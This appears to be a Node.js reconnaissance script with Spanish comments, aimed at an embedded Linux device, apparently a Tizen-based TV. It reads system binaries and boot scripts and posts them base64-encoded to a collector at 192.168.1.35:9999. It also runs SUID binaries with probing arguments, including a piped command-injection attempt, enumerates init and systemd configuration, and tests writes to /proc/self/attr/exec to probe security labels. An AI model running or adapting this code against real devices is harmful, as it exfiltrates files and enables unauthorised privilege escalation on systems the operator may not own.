/**
 * service.js v7 — análisis de binarios SUID (wasutility / RunningAppsService)
 * eficacia: los lee (world-readable por 755) y los manda al colector como base64
 * + corriente con marshalling de comandos de la SUID / ryzywla (symtoms / --help)
 * + listado de /etc/rc.d/init.d y /usr/lib/systemd/system (como se lanza firstscreen) + /opt/etc/fkp
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');
var DEST = { host: '192.168.1.35', port: 9999 };

function post(path, obj) {
    var body = JSON.stringify(obj);
    var req = http.request({ host: DEST.host, port: DEST.port, path: path, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function (e) { });
    req.write(body); req.end();
}

(function main() {
    var files = [
        '/usr/bin/wasutility',
        '/usr/bin/RunningAppsService',
        '/etc/rc.d/rc.sysinit',
        '/etc/rc.d/rc.shutdown',
        '/usr/bin/launchpad-process-pool.sh',
        '/usr/bin/mdnsresponder-server.sh',
        '/usr/bin/check-booting-mode.sh'
    ];
    files.forEach(function (fp) {
        try {
            var buf = fs.readFileSync(fp);
            post('/dump', { name: fp.split('/').pop(), path: fp, b64: buf.toString('base64'), len: buf.length });
        } catch (e) {
            post('/dump', { name: fp.split('/').pop(), err: String(e.message) });
        }
    });

    // test de llamadas a la SUID
    var cmdlist = [
        '/usr/bin/wasutility',
        '/usr/bin/wasutility --help',
        '/usr/bin/wasutility -h',
        '/usr/bin/wasutility help',
        '/usr/bin/wasutility -v',
        '/usr/bin/wasutility install',
        '/usr/bin/wasutility usage',
        'echo id-test | /usr/bin/wasutility -i; /usr/bin/wasutility -i id',
        '/usr/bin/RunningAppsService --help 2>&1 | head -20'
    ];
    var outs = [];
    (function next(i) {
        if (i >= cmdlist.length) { return; }
        cp.exec(cmdlist[i], { timeout: 6000 }, function (err, so, se) {
            outs.push({ cmd: cmdlist[i], out: String(so).slice(0, 800), errout: String(se).slice(0, 300), err: err ? String(err.message || err) : null });
            next(i + 1);
            if (i === cmdlist.length - 1) {
                post('/suexec', { outs: outs });
            }
        });
    })(0);

    // listados para entender el flujo boot/init
    var cmds = [
        'ls -la /etc/rc.d/init.d 2>&1 | head -30',
        'for f in /etc/rc.d/init.d/*; do echo "== $f"; head -8 "$f" 2>&1; done 2>&1 | head -120',
        'ls -la /usr/lib/systemd/system 2>&1 | head -40',
        'grep -rlE "firstscreen|appstore" /usr/lib/systemd/system /etc 2>/dev/null | head -10',
        'ls -la /opt/etc/fkp 2>&1 | head -20',
        'ls -la /etc/package-manager/dbspace 2>&1',
        'ls -la /etc/systemd/system 2>&1 | head -15',
        'cat /proc/self/attr/prev 2>&1; echo --; cat /proc/self/attr/exec 2>&1',
        'echo test > /proc/self/attr/exec 2>&1; echo "attr/exec write rc=$?"'
    ];
    var outs2 = [];
    (function next2(i) {
        if (i >= cmds.length) { post('/sysmap', { outs: outs2 }); return; }
        cp.exec(cmds[i], { timeout: 6000 }, function (err, so, se) {
            outs2.push({ cmd: cmds[i], out: String(so).slice(0, 3000), errout: String(se).slice(0, 300) });
            next2(i + 1);
        });
    })(0);
})();
